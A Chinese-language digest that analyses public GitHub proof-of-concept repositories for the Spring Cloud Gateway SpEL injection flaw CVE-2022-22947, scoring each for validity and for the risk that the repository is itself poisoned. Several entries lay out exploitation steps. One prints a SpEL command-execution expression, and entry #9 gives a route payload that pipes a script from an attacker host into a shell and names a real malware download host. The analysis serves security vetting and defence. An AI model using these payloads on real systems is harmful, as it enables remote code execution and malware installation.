CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator endpoint 启用、暴露且未进行安全保护时，允许未经身份验证的远程攻击者发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。根据搜索引擎结果和漏洞库信息，该漏洞已被公开利用，CISA KEV 中已收录。提供的代码片段是一个 Maven 项目的 `.iml` 文件，它描述了项目的依赖关系。虽然不能直接确定利用代码，但通过依赖信息（如 `spring-cloud-gateway-server:3.1.0`）可以推断该项目旨在构建一个易受攻击的 Spring Cloud Gateway 实例。利用方式通常涉及向 Actuator endpoint 发送包含恶意 SpEL 表达式的 HTTP 请求。投毒风险分析：提供的代码片段 `.iml` 文件本身不包含恶意代码，因为它只是描述了项目的依赖。 然而，整个代码仓库（如果存在其他文件）可能包含被作者隐藏的恶意代码。 这里将风险预估为10%，原因是不排除整个项目被投毒的可能性，例如构建脚本或隐藏的资源文件。

**项目地址:** [B0rn2d/Spring-Cloud-Gateway-Nacos](https://github.com/B0rn2d/Spring-Cloud-Gateway-Nacos)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #4

**来源**: [CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md](../2022/CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** 3.1.0, 3.0.0 至 3.0.6, 以及更早的不受支持版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未受保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点被启用、暴露且未受保护时，攻击者可以利用此漏洞发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**
提供的 POC 代码有效。它通过向 `/actuator/gateway/routes/{id}` 发送 POST 请求动态添加一个路由，该路由包含一个利用 SpEL 表达式执行命令的 filter。然后，通过 `POST /actuator/gateway/refresh` 刷新路由缓存来触发 SpEL 表达式的执行，从而实现远程代码执行。

**投毒风险：**
该漏洞利用代码仓库存在一定的投毒风险。具体分析如下：

1.  **依赖项版本：** POC 使用了 `spring-cloud-gateway-server` 和 `spring-cloud-starter-gateway` 的 3.0.6 版本，以及 `spring-boot-starter-actuator` 的 2.5.9 版本，这些版本组合是已知的漏洞版本，是复现漏洞的必要条件，不是投毒。
2.  **图片文件：** README.md 中引用了一些本地图片，这些图片可能包含恶意内容，但考虑到是本地图片，可能性较低。需要进一步分析确认。
3.  **漏洞利用方式：** POC 演示了如何利用 SpEL 表达式执行任意命令。攻击者可以修改 SpEL 表达式来执行恶意操作，例如安装后门程序、窃取敏感数据或进行拒绝服务攻击。
4.  **作者动机未知：** 在没有更多信息的情况下，无法确定作者的真实意图，不能排除作者故意引入恶意代码或配置的可能。

综合考虑，虽然 POC 本身是为了演示漏洞，但仓库中可能隐藏着其他恶意代码，因此存在一定的投毒风险。鉴于图片等本地资源可能存在风险，因此给出 10% 的投毒风险评估。

**利用方式：**

1.  **前提条件：** Spring Cloud Gateway 实例必须启用并暴露 Actuator 端点，且未进行安全保护。
2.  **添加路由：** 攻击者发送 POST 请求到 `/actuator/gateway/routes/{id}`，其中 `{id}` 是一个自定义的路由 ID。请求体包含一个 JSON 对象，该对象定义了路由的 predicates 和 filters。其中，filters 包含一个 AddResponseHeader filter，其 `value` 属性包含一个 SpEL 表达式，该表达式将执行任意命令。
3.  **刷新路由：** 攻击者发送 POST 请求到 `/actuator/gateway/refresh` 以刷新路由缓存。这将导致 Spring Cloud Gateway 重新加载路由配置，并解析和执行 SpEL 表达式。
4.  **代码执行：** SpEL 表达式执行任意代码，从而允许攻击者控制受影响的系统。

**项目地址:** [Enokiy/cve-2022-22947-spring-cloud-gateway](https://github.com/Enokiy/cve-2022-22947-spring-cloud-gateway)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #5

**来源**: [CVE-2022-22947-LY613313_CVE-2022-22947.md](../2022/CVE-2022-22947-LY613313_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator endpoint 启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入，执行任意代码。利用方式是发送包含恶意SpEL表达式的POST请求到/actuator/gateway/routes端点，然后刷新路由，触发SpEL表达式的执行，从而实现远程代码执行。

**有效性评估：**
根据漏洞信息和POC代码，此POC代码是有效的。漏洞库信息明确指出该漏洞允许远程代码执行，搜索引擎结果也确认了这一点，并且提供了公开的漏洞利用代码。

**投毒风险评估：**
代码本身看起来是标准的漏洞利用代码，用于利用 CVE-2022-22947 漏洞。其中一个潜在的风险点在于 `commond` 变量，该变量从用户输入获取，然后拼接到 SpEL 表达式中。如果用户输入恶意或过长的命令，可能会导致目标系统崩溃或执行意外操作。但是，这不属于作者投毒的范畴。`base64cmd` 函数将用户输入的命令进行 Base64 编码，这本身并非恶意行为，但如果用户输入的命令本身就具有破坏性，Base64 编码只是对其进行了编码，并没有改变其本质。总体来看，该 POC 代码的投毒风险较低，约为 10%。主要的风险在于用户输入，而非代码本身。

**漏洞利用方式：**
1.  **条件判断：** 确定目标系统运行着受影响的 Spring Cloud Gateway 版本，并且 Gateway Actuator endpoint 处于启用、暴露且未进行安全保护的状态。
2.  **构造恶意请求：** 使用POST请求，构造包含恶意SpEL表达式的JSON数据，发送到`/actuator/gateway/routes`端点。SpEL表达式中包含要执行的系统命令。
3.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，刷新Gateway的路由配置，触发SpEL表达式的执行。
4.  **执行任意代码：** 恶意SpEL表达式被执行，从而在目标系统上执行任意代码，例如反弹shell。
5.  **清理：** 删除添加的路由，再次刷新路由。


**项目地址:** [LY613313/CVE-2022-22947](https://github.com/LY613313/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #6

**来源**: [CVE-2022-22947-Le1a_CVE-2022-22947.md](../2022/CVE-2022-22947-Le1a_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** 需要Gateway Actuator端点启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator端点被启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入执行任意代码。  

**有效性：**
提供的PoC代码有效。代码通过构造包含恶意SpEL表达式的路由配置，利用`/actuator/gateway/routes`端点添加恶意路由，然后通过`/actuator/gateway/refresh`端点刷新路由，触发SpEL表达式执行，从而实现远程代码执行。PoC代码在执行命令后，还会删除创建的恶意路由，并再次刷新路由，以清除痕迹。

**投毒风险：**
该仓库中的PoC代码没有发现明显的投毒代码。PoC代码的功能明确，即利用漏洞执行命令并返回结果。代码主要通过`requests`库发送HTTP请求，并使用`re`库解析命令执行结果。没有任何迹象表明作者在代码中隐藏了恶意逻辑或后门。

**利用方式：**
1.  **目标确认：**  确认目标系统正在运行存在漏洞的Spring Cloud Gateway版本，并且Actuator端点已启用、暴露且未授权访问。
2.  **构造恶意请求：**  攻击者构造一个包含恶意SpEL表达式的JSON payload，发送到`/actuator/gateway/routes/{id}`端点，其中SpEL表达式用于执行任意命令。例如，`#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()))}`
3.  **刷新路由：**  发送一个POST请求到`/actuator/gateway/refresh`端点，强制Gateway刷新路由配置，从而触发SpEL表达式执行。
4.  **获取执行结果：**  发送一个GET请求到`/actuator/gateway/routes/{id}`，获取包含执行结果的响应头。
5.  **清理：** 删除添加的恶意路由，并再次刷新路由。

**项目地址:** [Le1a/CVE-2022-22947](https://github.com/Le1a/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #7

**来源**: [CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md](../2022/CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md)

## CVE-2022-22947 Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意远程代码。该漏洞的利用方式如下：

1.  **漏洞原理：** 漏洞根源在于 SpEL 表达式的错误处理，攻击者可以通过 SpEL 表达式注入恶意代码。
2.  **利用步骤：**
    *   攻击者首先发送包含恶意 SpEL 表达式的请求到 `/actuator/gateway/routes/` 端点，添加一个新的路由，其中 `filter` 使用 `AddResponseHeader` 过滤器，`value` 包含恶意的 SpEL 表达式，SpEL表达式会被base64编码，保证其可以正常传输
    *   然后，攻击者通过访问 `/actuator/gateway/refresh` 端点，强制网关刷新路由配置，从而触发 SpEL 表达式的执行。
    *   最后，攻击者可以通过访问之前创建的路由(`/actuator/gateway/routes/66Sec`)，触发 SpEL 表达式的执行，并将执行结果通过请求返回。
3.  **POC 代码分析：**
    *   `CVE-2022-22947.py` 脚本首先定义了几个关键变量，包括 URL 路径（`payload1`, `payload2`, `payload3`）和请求头（`headers`）。
    *   `data` 变量包含经过 Base64 编码的恶意路由配置信息。该配置信息设置了一个名为 `WeianSec` 的路由，该路由使用 `AddResponseHeader` 过滤器，并将 SpEL 表达式注入到 `value` 属性中。
    *   脚本使用 `requests` 库发送 POST 请求到 `/actuator/gateway/routes/66Sec` 端点，添加恶意路由。
    *   然后，脚本发送 POST 请求到 `/actuator/gateway/refresh` 端点，刷新路由配置。
    *   最后，脚本发送 GET 请求到 `/actuator/gateway/routes/66Sec` 端点，提取执行结果。
    *   脚本中的 cmd变量，允许用户自定义执行的命令，增加了灵活性。
4.  **有效性：** 根据漏洞库信息、搜索结果和提供的 POC 代码，该 POC 代码是有效的，可以实现远程代码执行。
5.  **投毒风险：** 仓库中存在小概率的投毒风险（10%）。风险点在于，虽然主脚本 `CVE-2022-22947.py` 看似直接利用漏洞，但攻击者可以通过修改 `cmd` 变量来执行任意命令，并且README.md文件中提供的图片是经过处理的，不排除作者后期修改代码，添加恶意后门的可能。

**项目地址:** [SecNN/CVE-2022-22947_Rce_Exp](https://github.com/SecNN/CVE-2022-22947_Rce_Exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #8

**来源**: [CVE-2022-22947-SiJiDo_CVE-2022-22947.md](../2022/CVE-2022-22947-SiJiDo_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), and unsupported versions

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。攻击者可以在 Gateway Actuator 端点开启且未进行安全保护的情况下，通过构造恶意请求执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** 该漏洞源于 Spring Cloud Gateway 中 SpEL 表达式的执行，攻击者可以通过 SpEL 表达式注入恶意代码，进而执行任意命令。
2.  **利用条件：**
    *   目标系统使用存在漏洞的 Spring Cloud Gateway 版本。
    *   Gateway Actuator 端点被启用。
    *   Gateway Actuator 端点对外暴露且未进行任何身份验证。
3.  **漏洞利用代码分析：** 提供的Python脚本 (exp.py)首先定义了一个`GMem`类，将编译后的java字节码进行base64解码后赋值给`classbytes`。该Java类主要功能：
    *   通过反射机制定义类 (`ReflectUtils.defineClass`)
    *   执行命令
    *   进行base64编码/解码等操作。
    *   创建了一个包含payload的HashMap，payload被精心构造用于在目标服务器上执行命令。
    脚本通过修改`RequestMappingInfo`的`Builder`并调用`build()`方法触发漏洞，最终导致RCE。
4.  **有效性评估：** 根据漏洞信息和利用代码，该漏洞利用的有效性较高。CISA 将其添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。
5.  **投毒风险评估：** 代码存在一定的投毒风险。虽然脚本主要功能是利用漏洞，但其中嵌入的Java类和SpEL表达式可能包含其他未知的恶意行为。该脚本通过Base64编码隐藏了部分代码，增加了分析难度。该脚本存在投毒风险的可能性为10%, 主要是由于代码混淆和潜在的Java恶意行为。
6.  **利用方式总结：**
    *   攻击者发送恶意构造的 HTTP 请求到 Gateway Actuator 端点。
    *   请求中包含 SpEL 表达式，用于执行任意代码。
    *   Spring Cloud Gateway 在处理请求时，由于没有对 SpEL 表达式进行充分的验证和过滤，导致代码注入。
    *   攻击者通过代码注入执行恶意命令，例如反弹 shell 或执行其他恶意操作。

综上所述，CVE-2022-22947 是一个严重的安全漏洞，攻击者可以利用它在目标系统上执行任意代码，因此需要及时修复。

**项目地址:** [SiJiDo/CVE-2022-22947](https://github.com/SiJiDo/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #9

**来源**: [CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md](../2022/CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator 端点已启用、公开且未受保护。

**POC 可用性:** 是

**投毒风险:** 85%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意的 SpEL 表达式来执行任意代码。 

**有效性：**
根据漏洞信息、搜索结果和提供的 POC 代码，该漏洞利用是有效的。POC 通过向 `/actuator/gateway/routes` 端点发送 POST 请求来创建新的路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。然后刷新路由，并通过访问新创建的路由触发代码执行。最后删除该路由。

**投毒风险：**
提供的 POC 代码存在较高的投毒风险。具体体现在：
1.  **恶意脚本下载和执行：** POC 代码中的 SpEL 表达式尝试从远程服务器（如 `94.103.87.71/scg.sh` ）下载并执行 shell 脚本。 这允许攻击者注入任意恶意代码，例如下载和安装 Kinsing 恶意软件。
2.  **后门植入：** 下载的 shell 脚本可能包含后门代码，允许攻击者在受害者系统上保持持久访问。
3. ** Kinsing恶意软件:** 通过分析shell脚本，发现最终目的是下载并安装 Kinsing 恶意软件

因此，此存储库的投毒风险非常高，约为 85%。使用此POC需要谨慎，务必在隔离环境中进行分析，确保不会对本地环境造成风险。

**利用方式：**
1.  **检查 Actuator 端点：** 确认目标 Spring Cloud Gateway 实例的 Actuator 端点是否启用、公开且未受保护。
2.  **创建恶意路由：** 使用 POST 请求向 `/actuator/gateway/routes` 端点创建一个新的路由。在路由的 `filters` 部分，使用 `AddResponseHeader` 过滤器，并在 `value` 字段中插入包含恶意 SpEL 表达式的代码。 例如:

   ```json
   {
	 "id": "poc",
	 "filters": [{
	   "name": "AddResponseHeader",
	   "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl -s <ATTACKER_IP>/shell.sh|sh\"}).getInputStream()))}"}
	   }],
	 "uri": "http://example.com",
	 "order": 0
	}
   ```

3.  **刷新路由：** 使用 POST 请求向 `/actuator/gateway/refresh` 端点发送请求，以刷新所有路由。
4.  **触发代码执行：** 访问新创建的路由，触发 SpEL 表达式的执行。
5.  **清理：** 使用 DELETE 请求向 `/actuator/gateway/routes/{route_id}` 端点删除创建的恶意路由。

**项目地址:** [Sumitpathania03/CVE-2022-22947](https://github.com/Sumitpathania03/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #10

**来源**: [CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md](../2022/CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的代码注入漏洞。根据漏洞描述，当 Gateway Actuator 端点启用、公开且未受到保护时，应用程序容易受到代码注入攻击。攻击者可以发送恶意构造的请求，从而允许在远程主机上执行任意远程代码。

**有效性：**
提供的 POC 代码 `CVE-2022-22947-memshell.py` 看起来是有效的。它利用了 SpEL 表达式注入漏洞，通过构造包含恶意 SpEL 表达式的请求，在目标系统上动态定义一个名为 `SpringRequestMappingMemshell` 的类，实现内存马注入。代码首先对恶意类进行base64编码, 然后通过SpEL表达式解码并加载到JVM中,达到了远程代码执行的效果。

**投毒风险：**
评估 POC 代码是否存在投毒风险。代码的主要功能是利用漏洞注入内存马，实现远程代码执行。其中注入的`SpringRequestMappingMemshell`类需要进一步分析。

通过检查代码，发现注入的类功能是注册一个requestMapping，执行的command命令可以从request参数中获取，具有命令执行功能，但它本身是漏洞利用的一部分，不能算作是作者隐藏的投毒代码。

但考虑到任何远程代码执行漏洞都可能被滥用，因此使用此POC的风险仍然较高。考虑到风险的存在，但不是代码编写者有意为之的恶意添加，评估投毒风险为5%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例的 Actuator 端点必须启用、公开且未受保护。
2.  **漏洞利用：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP 请求，该表达式会被 Gateway Actuator 处理。
3.  **代码注入：** 恶意 SpEL 表达式用于在服务器的内存中定义一个新的 Java 类 (内存马)。
4.  **远程代码执行：** 注入的 Java 类执行攻击者指定的任意代码。

总而言之，此漏洞的利用方式是通过SpEL表达式注入，动态注册一个新的路由，并将处理逻辑绑定到恶意构造的Java类，该类可以接受参数并在服务器上执行任意命令。此过程允许攻击者在目标系统上实现未经授权的远程代码执行。

**项目地址:** [Wrong-pixel/CVE-2022-22947-exp](https://github.com/Wrong-pixel/CVE-2022-22947-exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #11

**来源**: [CVE-2022-22947-Zh0um1_CVE-2022-22947.md](../2022/CVE-2022-22947-Zh0um1_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1+, 3.0.x < 3.0.7+

**利用条件:** Gateway Actuator endpoint 启用、暴露且未做安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Actuator 端点启用且未授权时，攻击者可以通过构造恶意的 SpEL 表达式，利用`Path`路由断言中的 SpEL 注入漏洞执行任意代码。提供的 POC 代码旨在通过动态定义Java类的方式注入哥斯拉内存马。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被证实存在，且有在野利用。提供的 POC 代码实现了利用该漏洞注入哥斯拉内存马，因此该 POC 有效。

**投毒风险分析：**
分析给出的POC代码，主要功能是利用漏洞注入哥斯拉内存马，实现远程代码执行。虽然POC本身是为了利用漏洞，但如果用户直接使用此POC而不了解其行为，可能会被利用来植入恶意后门。

*   代码主要功能：该代码使用Go语言编写，利用 Spring Cloud Gateway 的 SpEL 表达式注入漏洞。它构造一个包含恶意 SpEL 表达式的请求，该表达式用于在目标服务器上动态定义一个 Java 类（哥斯拉内存马），从而实现远程代码执行。
*   投毒可能性：
    *   **高：** 代码直接注入内存马，如果目标系统部署了恶意程序，攻击者也可以构造其他的恶意代码注入到内存中，比如替换关键组件、窃取数据等。
    *   **低：** 由于代码的目的是利用漏洞注入内存马，从这个角度看，本身就是一种攻击行为，很难区分是“正常”利用还是“投毒”。因此，认为该仓库存在一定投毒风险，风险等级较低。

基于以上分析，判定投毒风险为10%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，且未进行安全保护（例如，未进行身份验证）。
2.  **构造恶意请求：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP POST 请求，该表达式利用 `T(org.springframework.cglib.core.ReflectUtils).defineClass` 动态定义一个 Java 类（通常是一个 Webshell 或内存马）。
3.  **利用 Path 路由断言：**  该恶意 SpEL 表达式被嵌入到 Spring Cloud Gateway 的 `Path` 路由断言的参数中。
4.  **发送请求：** 将构造的恶意请求发送到 `/actuator/gateway/routes` 端点。
5.  **代码执行：** Spring Cloud Gateway 在处理路由断言时，会解析并执行 SpEL 表达式，从而在目标服务器上执行攻击者注入的恶意代码。
6.  **内存马驻留：** 注入的哥斯拉内存马会驻留在服务器内存中，允许攻击者通过特定的 HTTP 请求与服务器交互，执行任意命令或上传文件。

**项目地址:** [Zh0um1/CVE-2022-22947](https://github.com/Zh0um1/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #12

**来源**: [CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md](../2022/CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md)

## CVE-2022-22947-Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator endpoint is enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是一个存在于Spring Cloud Gateway中的代码注入漏洞。当Gateway Actuator端点被启用、暴露且未进行安全保护时，远程攻击者可以通过构造恶意请求执行任意代码。漏洞根源在于getValue方法中不安全的SpEL表达式求值。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，且已经有公开的POC。漏洞利用代码是一个Maven项目，旨在重现漏洞。因此，提供的POC代码很可能是有效的。

**投毒风险：**
提供的代码仓库包含一个`README.md`文件和一个`mvnw`脚本。`mvnw` 是 Maven Wrapper 脚本，用于在没有安装 Maven 的情况下构建项目。检查 `mvnw` 脚本，它主要负责下载和启动 Maven，没有发现明显的恶意行为。但是，仍然存在一定的投毒风险，例如：
1.  **依赖项投毒：** 构建项目时使用的 Maven 依赖项可能包含恶意代码。 这种情况发生的概率较低，但存在可能。
2.  **构建脚本投毒：** `pom.xml`文件(未提供)中可能存在恶意插件或目标，在构建过程中执行恶意代码。由于未提供此文件，无法对此进行评估。

考虑到提供的文件主要与Maven构建相关，直接植入后门的难度较高，但通过依赖项投毒的可能性是存在的。因此，投毒风险估计为10%。

**利用方式：**
1.  **确定目标：** 找到运行着存在漏洞的Spring Cloud Gateway实例，并且其Actuator端点对外开放且未进行认证。
2.  **构造恶意请求：** 构造包含恶意SpEL表达式的HTTP请求，发送到Actuator端点。这些SpEL表达式能够执行任意系统命令或代码。
3.  **远程代码执行：**  Spring Cloud Gateway解析并执行恶意SpEL表达式，从而导致远程代码执行。
4.  **控制系统：** 攻击者利用执行的恶意代码控制受害系统。

**优先级：**
根据信息来源的重要性排序：搜索引擎结果 > 漏洞利用代码 > 漏洞库信息

**项目地址:** [aesm1p/CVE-2022-22947-POC-Reproduce](https://github.com/aesm1p/CVE-2022-22947-POC-Reproduce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #13

**来源**: [CVE-2022-22947-anansec_CVE-2022-22947_EXP.md](../2022/CVE-2022-22947-anansec_CVE-2022-22947_EXP.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、公开且未进行安全保护时，攻击者可以通过构造恶意请求，在远程主机上执行任意代码。根据提供的漏洞利用代码，该PoC利用了SpEL表达式注入，通过向`/actuator/gateway/routes/check01`端点发送包含恶意SpEL表达式的POST请求，然后刷新路由并访问该路由，触发SpEL表达式执行。EXP具有单个目标验证、批量验证、反弹shell的功能。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，可以判断该漏洞的PoC代码是有效的。搜索结果中多个链接都表明该漏洞被广泛关注，且存在公开的利用代码。

**投毒风险：**
PoC代码本身主要通过SpEL表达式注入执行命令，没有发现明显的恶意植入行为。但PoC会向目标系统添加路由，并执行命令，存在一定的风险。例如：
*   **资源消耗：** 频繁的路由添加和删除可能导致资源消耗，影响服务性能。
*   **命令执行风险：** 虽然PoC本身是为了验证漏洞，但如果被恶意利用，可能执行恶意命令。
*   **依赖风险：** PoC可能依赖特定的环境或库，如果目标环境不满足要求，可能导致利用失败或产生其他问题。
PoC代码中存在投毒代码的可能性较低，大约10%。这个百分比是基于代码的分析以及PoC作者的动机推断得出的。

**利用方式：**
1.  **前提条件：** Spring Cloud Gateway的Actuator端点已启用、公开且未进行安全保护。
2.  **发送恶意请求：** 构造包含恶意SpEL表达式的JSON数据，并将其作为POST请求发送到`/actuator/gateway/routes/check01`端点。
3.  **刷新路由：** 向`/actuator/gateway/refresh`端点发送POST请求，刷新路由，使新增的路由生效。
4.  **触发表达式执行：** 访问新增的路由，触发SpEL表达式执行，从而执行任意代码。
5.  **清理路由：** 删除新增的路由，避免留下后门。（PoC代码中包含删除路由的步骤）

**项目地址:** [anansec/CVE-2022-22947_EXP](https://github.com/anansec/CVE-2022-22947_EXP)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #14

**来源**: [CVE-2022-22947-cc3305_CVE-2022-22947.md](../2022/CVE-2022-22947-cc3305_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。漏洞的根源在于`getValue`方法中不安全的SpEL表达式评估。利用过程为：

1.  攻击者构造包含恶意SpEL表达式的payload，该表达式可以执行任意命令。
2.  攻击者通过POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是一个攻击者自定义的路由ID。
3.  Spring Cloud Gateway解析payload中的SpEL表达式，导致远程代码执行。
4.  攻击者可以通过`/actuator/gateway/refresh`端点刷新路由配置，使payload生效。

该POC代码通过向 `/actuator/gateway/routes/cc3305` 发送包含恶意SpEL表达式的JSON payload来利用此漏洞，SpEL表达式通过java.lang.Runtime执行任意命令。 代码首先检查目标是否易受攻击（虽然目前返回True）。然后，它准备要执行的命令，并将其嵌入到SpEL表达式中，该表达式会被注入到路由定义中。

关于投毒风险，该脚本主要功能是利用漏洞执行命令。 潜在的投毒风险在于，攻击者可能会修改脚本，使其在执行命令之前或之后执行其他恶意操作，例如下载和执行恶意软件。 但是，提供的代码没有明显的投毒迹象。 投毒的概率较低，大约为1%。 恶意行为者可能会分发修改后的版本。

